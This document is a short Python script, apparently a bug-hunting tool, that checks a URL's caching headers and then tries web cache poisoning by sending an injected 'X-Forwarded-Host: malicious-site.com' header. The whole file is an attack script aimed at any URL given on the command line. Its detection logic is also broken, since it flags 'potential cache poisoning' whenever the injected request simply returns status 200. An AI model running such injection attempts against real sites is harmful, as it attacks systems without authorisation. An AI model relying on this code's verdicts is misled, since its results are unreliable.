import argparse
import requests

def print_banner():
    banner = """
    ╔════════════════════════════════════════════════════════════════════════════╗
    ║                   Cache Poisoning Checker By @godxfinger                   ║
    ╚════════════════════════════════════════════════════════════════════════════╝
    """
    print(banner)

def check_cache_and_poisoning(url):
    try:
        # Original request to check caching behavior
        response_original = requests.get(url, timeout=10)  # Adjust timeout as needed
        response_original.raise_for_status()  # Raise HTTPError for bad responses
        headers_original = response_original.headers
        
        # Check caching status
        cache_control = headers_original.get('Cache-Control', '')
        expires = headers_original.get('Expires', '')
        age = headers_original.get('Age', '')
        
        print(f"URL: {url}")
        print("Cache-Control:", cache_control)
        print("Expires:", expires)
        print("Age:", age)
        
        if 'no-cache' in cache_control or 'no-store' in cache_control:
            print("The response is not being cached.")
        else:
            print("The response is being cached.")
            
            # Attempt cache poisoning based on known techniques
            # Example technique: injecting X-Forwarded-Host header
            headers_poisoned = {'X-Forwarded-Host': 'malicious-site.com'}
            response_poisoned = requests.get(url, headers=headers_poisoned, timeout=10)  # Adjust timeout as needed
            
            # Check if poisoning was successful
            if response_poisoned.status_code == 200:
                print(f"Potential Cache Poisoning at {url}.")
            else:
                print(f"Cache poisoning attempt failed for {url}.")
        
        print('-' * 80)
    
    except requests.RequestException as e:
        print(f"Failed to fetch {url}: {e}")
        print('-' * 80)

def main():
    print_banner()
    
    parser = argparse.ArgumentParser(description='Check caching behavior and attempt cache poisoning.')
    parser.add_argument('--url', required=True, help='URL to check and attempt cache poisoning on')
    args = parser.parse_args()
    
    url = args.url
    check_cache_and_poisoning(url)

if __name__ == '__main__':
    main()
